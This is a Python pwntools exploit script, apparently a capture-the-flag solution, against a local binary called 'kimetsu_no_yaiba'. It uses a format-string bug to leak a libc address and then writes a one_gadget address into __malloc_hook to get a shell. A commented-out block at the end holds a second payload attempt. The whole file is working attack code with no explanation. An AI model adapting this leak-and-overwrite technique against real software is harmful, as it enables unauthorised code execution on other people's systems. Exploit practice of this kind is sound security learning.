from pwn import *

io = process('./kimetsu_no_yaiba')
elf = ELF('./kimetsu_no_yaiba')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')



print(io.recvuntil('Let\'s give your name before the fight: '))
io.sendline('%23$p')
print(io.recvuntil('> '))
io.sendline('2')
io.sendline('99999999')
print(io.recvuntil('WINNER: '))
libc.address = int(io.recvline(), 16) - libc.sym['__libc_start_main'] - 243
print(io.recv())
io.sendline('y')
print(io.recvuntil('Let\'s give your name before the fight: '))
gadget = libc.address + 0xe6c7e
malloc_hook = libc.sym['__malloc_hook']
mag1 = str(int(hex(gadget)[12:], 16)).encode('utf-8')
payload = b'%'+mag1+b'x%11$n'+p64(malloc_hook)
print(len(payload))
print(payload)
pause()
io.sendline(payload)
print(io.recvuntil('> '))
io.sendline('2')
pause()
io.sendline('99999999')
print(io.recvuntil('WINNER: '))
print(io.recv())
io.sendline('y')
'''
mag1 = str((int(hex(next(libc.search(b'/bin/sh')))[10:], 16))).encode('utf-8')
payload = b'%'+mag1+b'x%11$p'+p64(elf.sym['stdin'])
print(len(b'%'+mag1+b'x%11$p'))
print(payload)
#io.sendline('')
'''
